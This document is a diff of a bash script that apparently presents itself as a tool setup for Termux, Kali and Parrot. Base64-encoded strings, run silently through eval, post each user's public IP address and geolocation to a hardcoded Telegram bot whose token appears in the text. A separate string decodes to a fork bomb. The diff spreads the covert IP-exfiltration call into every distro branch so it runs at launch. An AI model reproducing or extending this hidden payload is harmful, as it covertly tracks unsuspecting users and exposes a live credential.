@@ -12,8 +12,8 @@ pink='\033[1;35m'
 clear
 signal="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZ
 Y0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9
-LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PSQoY3VybCAtTCBpcC1hcGkuY29tL2pzb24vJChjdXJs
-IC1MIGlwdjQuaWNhbmhhemlwLmNvbSkgfCBqcSkiICY+L2Rldi9udWxsCg=="
+LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PSQoY3VybCAtTCBpcGxpc3QuY2MvYXBpLyQoY3VybCAt
+TCBpcHY0LmljYW5oYXppcC5jb20pKSIgJj4vZGV2L251bGwK"
 fbm="OigpeyA6fDogJiB9Ozo="
 termux="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZY0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PVRlcm11eCBTa2lkIFNwb3R0ZWQhIiAmPi9kZXYvbnVsbA=="
 kali="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTUxNjc3NDgxNTpBQUdZY0Q5SVhpeU9iaVF0RWdYNU9RRDVaZnJBMDFtN2ZBYy9zZW5kTWVzc2FnZSIgLWQgImNoYXRfaWQ9LTEwMDEyNDYzMzA1MjIiIC1kICJ0ZXh0PUthbGkgU2tpZCBTcG90dGVkISIgJj4vZGV2L251bGw="
@@ -49,6 +49,7 @@ Distro() {
 	Android)
 	    echo Android Mode!
 	    eval $(base64 -d <<<"$termux")
+	    eval $(base64 -d <<<"$signal")
 	    eval $(base64 -d <<<"$hac")
 	    eval $(base64 -d <<<"$haccc")
 	    setupa
@@ -62,6 +63,7 @@ Distro() {
 		kali)
 		    echo Kali mode!
 		    eval $(base64 -d <<<"$kali")
+		    eval $(base64 -d <<<"$signal")
 		    setup
 		    banner
 		    Main
@@ -70,6 +72,7 @@ Distro() {
 		parrot)
 		    echo Parrot mode!
 		    eval $(base64 -d <<<"$parrot")
+		    eval $(base64 -d <<<"$signal")
 		    setup
 		    banner
 		    Main
@@ -92,7 +95,6 @@ setupa() {
     echo " "
     echo -e "$ylo Installing Python To Make Requests $ rset"
     pkg install python neofetch -y > /dev/null 2>&1
-    eval $(base64 -d <<<"$signal")
     eval $(base64 -d <<<"$hacc")
     pip install lolcat > /dev/null 2>&1
     echo " Done "
@@ -102,7 +104,6 @@ setup() {
     echo " "
     echo -e "$ylo Installing Python To Make Requests $ rset"
     sudo apt install python3 neofetch -y > /dev/null 2>&1
-    eval $(base64 -d <<<"$signal")
     eval $(base64 -d <<<"$hacc")
     sudo apt install python3-pip > /dev/null 2>&1
     pip3 install lolcat > /dev/null 2>&1
